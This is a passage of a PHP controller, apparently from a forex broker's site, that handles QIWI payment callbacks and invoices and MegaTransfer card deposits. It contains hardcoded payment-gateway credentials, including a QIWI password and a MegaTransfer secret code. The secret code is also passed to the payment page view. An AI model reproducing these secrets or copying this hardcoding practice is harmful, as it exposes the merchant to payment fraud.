        if ($shop->getResult() == QCONST::SUCCESS) {
            $inv = $this->general_model->showssingle('deposit', 'transaction_id', $shop->getInvoiceID(), '*');
            $invData = $this->general_model->showssingle('qiwi', 'inv_number', $shop->getInvoiceID(), '*');
            //$accData = $this->general_model->whereCondition('all_accounts', array('user_id' => $invData['user_id'], 'approved' => 1));
//            $accData = $this->general_model->whereCondition('all_accounts', array('user_id' => $invData['user_id']));
            $accData = $this->general_model->whereConditionQuery($invData['user_id']);
            $test = ['data' => serialize($accData), 'ip' => $this->input->ip_address()];
            $this->general_model->insertmy('qiwi_test', $test);
            if (!$inv && $accData) {
                if ($invData['status'] == 'paid') {
                    $this->qiwiRespons($shop->getCode());
                    exit();
                }

                $insert_array = [
                    'status' => $shop->getStatus(),
                ];
                $this->general_model->updatemy('qiwi', 'inv_number', $shop->getInvoiceID(), $insert_array);

                //$accData = $this->general_model->showssingle("mt_accounts_set", "user_id", $invData['user_id'], "*");

                //If invoice status is paid - do something
                // if( $shop -> getStatus() == QCONST::STATUS_PAID ){
                if ($shop->getStatus() == QCONST::STATUS_PAID) {
                    $amount = $shop->getAmount();
                    $total_amount = $this->get_convert_amount($shop->getCurrency(), $amount, $accData['currency']);
                    $currency = $shop->getCurrency();

                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    $fee = $amount * 0.06;
                    $bonus = $amount * 0.30;
                    $conv_amount_fee_usd = $this->get_convert_amount($currency, $fee);
                    $conv_amount_bonus_usd = $this->get_convert_amount($currency, $bonus);
                    $amount -= $fee;

                    $conv_amount = $this->get_convert_amount($shop->getCurrency(), $amount, $accData['currency']);
                    $conv_amount_fee = $this->get_convert_amount($shop->getCurrency(), $fee, $accData['currency']);
                    $conv_amount_bonus = $this->get_convert_amount($shop->getCurrency(), $bonus, $accData['currency']);
                    $conv_amount_usd = $this->get_convert_amount($shop->getCurrency(), $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $shop->getInvoiceID(),
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $shop->getCurrency(),
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'QIWI',
                        'payment_status' => $this->paymentType_status['Deposit via QIWI'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bouns'],
                    ];

                    $data = [
                        'transaction_id' => $shop->getInvoiceID(),
                        'reference_id' => 0,
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $shop->getCurrency(),
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => $shop->getComment(),
                        'transaction_type' => 'qiwi',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via QIWI'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $shop->getInvoiceID(),
                            'reference_id' => 0,
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $shop->getCurrency(),
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => $shop->getComment(),
                            'transaction_type' => 'qiwi',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via QIWI'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['QIWI'].$shop->getInvoiceID());
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['QIWI'].$shop->getInvoiceID());
//                        $requestResult = $WebService->request_status;
//                        $ticket = $WebService->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                       // FXPP::BackAgentOfAccount($account_number);

                        $WebService2 = new WebService($config);
                        $WebService2->request_live_account_balance($account_number);
                        if ($WebService2->request_status === 'RET_OK') {
                            $balance = $WebService2->get_result('Balance');
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                        } else {
                            $insertDepositFailed['comment'] = $WebService2->request_status;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['QIWI'].$shop->getInvoiceID());
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['QIWI'].$shop->getInvoiceID());
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $balance = $WebService2->get_result('Balance');
                                $this->account_model->updateAccountBalance($account_number, $balance);
                            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                            } else {
                                $insertDepositFailed['comment'] = $WebService2->request_status;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    /*if(IPLoc::APIUpgradeDevIP()){
                        FXPP::updateAccountTradingStatusV2($account_number,$invData['user_id']); // for pro accounts
                    }else{*/
                    FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    // }

                    /* ========================================== Welcome bonus================================================ **/

//                     if ($invData['bouns'] == "tenpb") {
//
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'qiwi', 'tenpb', $data['transaction_id']);
//                    }

//                    if ($invData['bouns'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'qiwi', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bouns'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'qiwi', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bouns'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'qiwi', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bouns'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'qiwi', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bouns'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'qiwi', 'rhpb', $data['transaction_id']);
//                        }
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'qiwi', $invData['bouns'], $data['transaction_id'], false);

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $shop->getAmount();
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $shop->getAmount(),
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/

                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('Qiwi', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['QIWI'].$shop->getInvoiceID());
                    /* End **/

                    $this->qiwiRespons($shop->getCode());
                } else {
                    $this->qiwiRespons($shop->getCode());

                    // Send failed deposit mail report
                    //if ($invData['user_id'] == 54179) {
                    // $account_detail = $this->account_model->getAccountByUserId($invData['user_id']);
                    $email_details = [
                        'account_number' => $accData['account_number'],
                        'type' => 'Qiwi',
                        'reason' => strtoupper($shop->getStatusDescription()),
                    ];
                    $this->sendEmailFailedDeposit($email_details);

                    FXPP::failedPaymentNotify('qiwi', 1, $invData['user_id'], strtoupper($shop->getStatusDescription())); //FXPP-9628
                    //}
                }
            } else {
                $this->qiwiRespons($shop->getCode());

                // Send failed deposit mail report
                // $account_detail = $this->account_model->getAccountByUserId($inv['user_id']);
                $email_details = [
                    'account_number' => $accData['account_number'],
                    'type' => 'Qiwi',
                    'reason' => strtoupper($shop->getResultDescription()),
                ];
                $this->sendEmailFailedDeposit($email_details);
            }
        } else {
            $this->qiwiRespons($shop->getCode());
        }
        // $this->euRedirect(); // only for eu domain
    }

    public function qiwiRespons($code)
    {
        ob_end_clean();
        header('HTTP/1.1 200 OK');
        header('Content-type: text/xml; charset=utf-8');
        $response = '<?xml version="1.0" encoding="utf-8"?>';
        $response .= '<result> <result_code>'.$code.'</result_code> </result>';
        echo $response;
        exit();
    }

    public function qiwiCanceled()
    {
        $this->session->set_flashdata('qiwi_status', 1);
        $this->euRedirect(); // only for eu domain
        redirect('deposit/qiwi');
    }

    public function qiwi()
    {
        redirect(FXPP::loc_url('deposit'));
        if ($this->session->userdata('logged')) {
            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->get('bonus', true);
//            $account_detail = $this->general_model->whereCondition('all_accounts', array('user_id' => $this->session->userdata('user_id')));
//            $account_detail = $this->general_model->whereCondition('all_accounts', array('user_id' => $this->session->userdata('user_id')));
            $account_detail = $this->general_model->whereConditionQuery($this->session->userdata('user_id'));
            // $getaccount = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            $currency_conv = $account_detail['currency'];
            $acc_number = $account_detail['account_number'];
            //  if ($data['amount'] == null) {
            $this->form_validation->set_rules('customerNumber', 'Customer Number ', 'trim|required|xss_clean');
            $this->form_validation->set_rules('sum', 'Deposit amount', "trim|required|deposit_min_amount[$currency_conv]");
            // }

            $data['test'] = '';
            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                //  if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960

                // $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                //  if($account_detail['approved'] !=1){ redirect(FXPP::loc_url('deposit/qiwi'));}
                $number = $this->input->post('customerNumber', true);
                $amount = $this->input->post('sum', true);

                /* FXPP-6333
                $isMicro = $this->account_model->isMicro($account_detail['user_id']);
                if ($isMicro) {
                $amount /= 100;
                }
                 FXPP-6333 */
                if ($this->input->post('bounusfiled', true) == 'hpb') {
                    $validation = FXPP::Deposit100BonusValidation($this->session->userdata('user_id'), $amount);
                    if ($validation['Error']) {
                        $this->session->set_flashdata('hpb_error', $validation['ErrorMsg']);
                        redirect(FXPP::my_url('deposit/qiwi'));
                    }
                }

                $this->load->library('Qiwi');

                //  $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                    FXPP::failedPaymentNotify('qiwi'); //FXPP-9628

                    $inv = uniqid();
                $insert_array = [
                        'mobile' => $number,
                        'inv_number' => $inv,
                        'amount' => $amount,
                        'curency' => $account_detail['currency'],
                        'detail' => 'QIWI DEPOSIT',
                        'status' => '',
                        'user_id' => $this->session->userdata('user_id'),
                        'bouns' => $this->input->post('bounusfiled', true),
                    ];

                $this->general_model->insert('qiwi', $insert_array);

                FXPP::isEUPayment('deposit/qiwi');

                $shop = new QIWI('399501', '40572686', 'wSvuICfXoCfZcq8Qr529');

                $failUrl = site_url().'deposit/qiwiCanceled';
                $succUrl = site_url().'deposit/qiwiSuccess';

                //Setting parameters to create a new invoice
                    $shop->setInvoiceID($inv);  //The unique identifier of the account that is used on your website - up to 200 characters
                    $shop->setPhone($number); //The Visa QIWI Wallet user’s ID, to whom the invoice is issued
                    $shop->setAmount($amount);    //The invoice amount - rounded up to 2 or 3 decimal places after the comma
                    $shop->setCurency($account_detail['currency']);   //Invoice currency identifier (Alpha-3 ISO 4217 code)
                    $shop->setComment('ForexMart Deposit (QIWI - ['.$acc_number.'])');  //Comment to the invoice which is shown on the payment page
                    $shop->setLifeTime(800000);   //Time up to which the invoice is available for payment. Enter the number of seconds to count down from the current time or date+time in UNIX format
                    $shop->setPaySource(QCONST::QIWI); //Set the way to pay the invoice. QCONST::QIWI - to pay using QIWI website or QCONST::MOBILE to pay with mobile phone bills
                    $shop->setSuccessUrl($succUrl); //The URL to which the payer will be redirected in case of successful creation of Visa QIWI Wallet transaction.
                    $shop->setFailUrl($failUrl);  //The URL to which the payer will be redirected when creation of Visa QIWI Wallet transaction is unsuccessful.

                    //Creating new invoice
                $shop->newInvoice();

                $stat = $this->session->flashdata('qiwi_status');

                //Checking the result callback
                if ($shop->getResult() == QCONST::SUCCESS || !isset($stat)) {
                    //If success - redirect to the QIWI website
                    header('Location: '.$shop->getUrl());
                } else {
                    if ($stat) {
                        $reason = 'CANCELLED';
                    } else {
                        $reason = strtoupper($shop->getResultDescription());
                    }

                    $data['error'] = $shop->getError();

                    // Send failed deposit mail report
                    //  $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                    $email_details = [
                            'account_number' => $account_detail['account_number'],
                            'type' => 'Qiwi',
                            'reason' => $reason,
                        ];
                    $this->sendEmailFailedDeposit($email_details);
                }

                //Getting info about existing invoice
                    //  $shop -> getInvoice( 123 );
//                } else {
//                    if ($this->session->userdata('login_type') == 1) {
//                        $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
//                    } else {
//                        $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
//                    }
//
//                    $data['user_status'] = $user_status;
//                    $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
//                    $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
//                    $this->template->title("ForexMart | Deposit - QIWI")
//                        ->set_layout('internal/main')
//                        ->prepend_metadata()
//                        ->build('deposits/qiwi', $data);
//                }
            } else {
                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }

                $eu_payment_result = $this->euPaymentStatus($this->session->userdata('user_id'), 'qiwi'); //FXPP-9628
                $data['eu_payment_status'] = $eu_payment_result['error'];
                $data['eu_error_message'] = $eu_payment_result['error_msg'];

                // $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
                $this->template->title('ForexMart | Deposit - QIWI')
                    ->set_layout('internal/main')
                    ->prepend_metadata()
                    ->build('deposits/qiwi', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function megatransfer_cc_callback()
    {
        parse_str(file_get_contents('php://input'), $_POST);
        $response = $_POST['response'];

        $insDataArray = [
            'Response' => $response,
        ];
        $this->deposit_model->testresponsemegatransfer($insDataArray);
    }

    public function megatransfer_credit_card()
    {
        if ($this->session->userdata('logged')) {
            redirect(FXPP::loc_url('deposit')); //FXPP-9655

            if ($this->session->userdata('login_type') == 1) {
                $getUserProfileByUserId = $this->user_model->getUserProfileByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
            } else {
                $getUserProfileByUserId = $this->user_model->getUserProfileByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }

            $data['amount'] = $this->input->post_get('amount1', true);
            //  if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');
            //  }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }
            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
                // if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                $quantity = 1;
                $amount = $this->input->post('amount', true);

                /* FXPP-6333
                $isMicro = $this->account_model->isMicro($account['user_id']);
                if ($isMicro) {
                    $amount /= 100;
                }
                 FXPP-6333 */

                $secret_code = 'a2f3d777a9a77882042349a492ef52636991850e4414c998c396cc882a52a5c4';
                $separator = 'hGsyTf23';
                $merchant_id = 158964761;
                $total_amount = (int) $quantity * (float) $amount;
                $total_amount = sprintf('%1.2f', $total_amount);
                //$items = 'ForexMart Deposit';
                $test_accounts = [
                        '135835',
                    ];
                if (in_array($this->session->userdata('user_id'), $test_accounts)) {
                    // $items = 'ForexMart Deposit (Megatransfer CC - ['.$account['account_number'].'])';
                }
                $items = 'Megatransfer CC  - ['.$account['account_number'].']';
                $currency = $account['mt_currency_base'];
                $signature = hash('sha256', $secret_code.$separator.$merchant_id.$separator.$items.$separator.$quantity.$separator.$amount.$separator.$total_amount.$separator.$currency.$separator.$secret_code);

                $createDate = new DateTime($getUserProfileByUserId['created']);
                $newData = $createDate->format('Y-m-d');

                $date = new DateTime();
                $order_number = $date->getTimestamp();

//                insert database record
                $conv_amount = $this->get_convert_amount($currency, $amount);
                $depositArray = [
                        'transaction_id' => 0,
                        'reference_id' => $order_number,
                        'status' => 0,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $this->session->userdata('user_id'),
                        'date_request' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'MEGATRANSFER',
                        'conv_amount' => $conv_amount,
                    ];
                $deposit_id = $this->deposit_model->insertPayment($depositArray);

                if (IPLoc::Office()) {
                    $doc1 = '';
                    $doc2 = '';

                    $_FILES['userfile']['name'] = $_FILES['front_side']['name'];

                    $config['file_name'] = hash('haval192,4', time().$_FILES['userfile']['name']);
                    $config['upload_path'] = $this->config->item('asset_user_docs');//'./assets/user_docs';
                    $config['allowed_types'] = 'gif|JPG|JPEG|jpg|jpeg|png|bmp|pdf';
                    $config['max_size'] = '10240';
                    $config['overwrite'] = false; // DO NOT CHANGE
                    $this->load->library('upload', $config);

                    if ($this->upload->do_upload('front_side')) {
                        $uploadData = $this->upload->data();
                        $doc1 = $uploadData['file_name'];
                    }

                    $_FILES['userfile']['name'] = $_FILES['back_side']['name'];

                    $config['file_name'] = hash('haval192,4', time().$_FILES['userfile']['name']);
                    $config['upload_path'] =$this->config->item('asset_user_docs');// './assets/user_docs';
                    $config['allowed_types'] = 'gif|JPG|JPEG|jpg|jpeg|png|bmp|pdf';
                    $config['max_size'] = '10240';
                    $config['overwrite'] = false; // DO NOT CHANGE
                    $this->load->library('upload', $config);

                    if ($this->upload->do_upload('back_side')) {
                        $uploadData = $this->upload->data();
                        $doc2 = $uploadData['file_name'];
                    }

                    $card_doc = [
                            'deposit_id' => $deposit_id,
                            'doc1' => $doc1,
                            'doc2' => $doc2,
                            'create_date' => date('Y-m-d h:i:s'),
                        ];

                    $this->general_model->insert('card_documents', $card_doc);
                }

                $selectedBonus = '';
                if (isset($_GET['bonus']) and !empty($_GET['bonus'])) {
                    $selectedBonus = '?bonus='.$_GET['bonus'];
                }

//                merchant payment gateway parameters
                $paymentArray = [
                        'items' => $items,
                        'quantity' => $quantity,
                        'amount' => $amount,
                        'currency' => $currency,
                        'client_name' => $getUserProfileByUserId['full_name'],
                        'client_country' => $getUserProfileByUserId['country'],
                        'client_city' => $getUserProfileByUserId['city'],
                        'client_email' => $getUserProfileByUserId['email'],
                        'reg_date' => $newData,
//                    'url' => "http://testing.megatransfer.co.uk/payments/",
                        'gateway_url' => 'https://www.megatransfer.com/payments/',
                        'url' => 'https://www.forexmart.com',
                        'merchant_id' => $merchant_id,
                        'secret_code' => $secret_code,
                        'separator' => $separator,
                        'order_id' => $order_number,
                        'total_amount' => $total_amount,
                        'signature' => $signature,
                        'payment_method' => 'cc',
                        'success_url' => site_url().'deposit/megatransfer-credit-card-success',
                        'fail_url' => site_url().'deposit/megatransfer-credit-card-fail',
                        'callback_url' => site_url().'deposit/megatransfer_callback'.$selectedBonus,
                    ];

                FXPP::failedPaymentNotify('megatransfer_cc'); //FXPP-9628

                $this->load->view('deposits/megatransfer_payment_cc', $paymentArray);
//                } else {
//                    $data['account_currency'] = $this->general_model->getAccountCurrencyBase();
//                    if ($this->session->userdata('login_type') == 1) {
//                        $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
//                    } else {
//                        $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
//                    }
//                    $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
//
//                    $data['user_status'] = $user_status;
//                    $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id'));//joy deposit unverified
//                    if ($user_status) {
//                        if ($data['incomplete']) {
//                            $disabled = '';
//                        } else {
//                            $disabled = 'disabled';
//                        }
//                    } else if ($data['count_status']) {
//                        $disabled = 'disabled';
//                    } else {
//                        $disabled = 'disabled';
//                    }
//
//                    $data['disabled'] = $disabled;
//
//                    if ($this->session->userdata('login_type') == 1) {
//                        $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
//                    } else {
//                        $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
//                    }
//
//                    $data['eu_payment_status'] = $this->euPaymentStatus($this->session->userdata('user_id')); //FXPP-9628
//
//                    $data['account'] = $account;
//                    $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
//                    $data['account']['currency_new'] = $data['account']['currency'];
//                    if ($data['account']['currency_new'] == 'RUB') {
//                        $data['account']['currency_new'] = 'RUR';
//                    }
//                    $js = $this->template->Js();
//                    $this->template->title("ForexMart | Deposit - MegaTransfer")
//                        ->set_layout('internal/main')
//                        ->prepend_metadata("
//
//                        <script src='" . $js . "custom-deposit.js'></script>
//                            ")
//                        ->build('deposits/megatransfer_cc', $data);
//                }
            } else {
                $data['account_currency'] = $this->general_model->getAccountCurrencyBase();
                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));

                // $data['user_status'] = $user_status;
                $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id')); //joy deposit unverified
                if ($user_status) {
                    if ($data['incomplete']) {
                        $disabled = '';
                    } else {
                        $disabled = 'disabled';
                    }
                } elseif ($data['count_status']) {
                    $disabled = 'disabled';
                } else {
                    $disabled = 'disabled';
                }

                $data['disabled'] = $disabled;

                if ($this->session->userdata('login_type') == 1) {
                    $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
                } else {
                    $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                }

                $eu_payment_result = $this->euPaymentStatus($this->session->userdata('user_id'), 'megatransfer_cc'); //FXPP-9628
                $data['eu_payment_status'] = $eu_payment_result['error'];
                $data['eu_error_message'] = $eu_payment_result['error_msg'];

                $data['account'] = $account;
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
                $data['account']['currency_new'] = $data['account']['currency'];
                if ($data['account']['currency_new'] == 'RUB') {
                    $data['account']['currency_new'] = 'RUR';
                }
                $js = $this->template->Js();
                $this->template->title('ForexMart | Deposit - MegaTransfer')
                    ->set_layout('internal/main')
                    ->prepend_metadata("

                        <script src='".$js."custom-deposit.js'></script>
                            ")
                    ->build('deposits/megatransfer_cc', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function megatransfer()
    {
        if ($this->session->userdata('logged')) {
            redirect(FXPP::loc_url('deposit')); //FXPP-9655
            // $getUserProfileByUserId = $this->user_model->getUserProfileByUserId($this->session->userdata('user_id'));
            // $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));

            if ($this->session->userdata('login_type') == 1) {
                $getUserProfileByUserId = $this->user_model->getUserProfileByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
            } else {
                $getUserProfileByUserId = $this->user_model->getUserProfileByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }

            $currency_conv = $account['mt_currency_base'];
            $data['amount'] = $this->input->post_get('amount1', true);
            // if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Deposit amount', "trim|required|deposit_min_amount[$currency_conv]");
            //  }

            $data['hasError'] = false;
            if ($this->form_validation->run() === false) {
                $data['hasError'] = true;
            }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                // if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960

                $quantity = 1;

                $amount = $this->input->post('amount', true);

                $secret_code = 'a2f3d777a9a77882042349a492ef52636991850e4414c998c396cc882a52a5c4';
                $separator = 'hGsyTf23';
                $merchant_id = 158964761;
                $total_amount = (int) $quantity * (float) $amount;
                $total_amount = sprintf('%1.2f', $total_amount);
                $test_accounts = [
                        '135835',
                    ];

                if (in_array($this->session->userdata('user_id'), $test_accounts)) {
                    //  $items = 'ForexMart Deposit (Megatransfer - ['.$account['account_number'].'])';
                }

                $items = 'Megatransfer - ['.$account['account_number'].']';
                $currency = $account['mt_currency_base'];
                $signature = hash('sha256', $secret_code.$separator.$merchant_id.$separator.$items.$separator.$quantity.$separator.$amount.$separator.$total_amount.$separator.$currency.$separator.$secret_code);

                $createDate = new DateTime($getUserProfileByUserId['created']);
                $newData = $createDate->format('Y-m-d');

                $date = new DateTime();
                $order_number = $date->getTimestamp();

//                insert database record
                $conv_amount = $this->get_convert_amount($currency, $amount);
                $depositArray = [
                        'transaction_id' => 0,
                        'reference_id' => $order_number,
                        'status' => 0,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $this->session->userdata('user_id'),
                        'date_request' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'MEGATRANSFER',
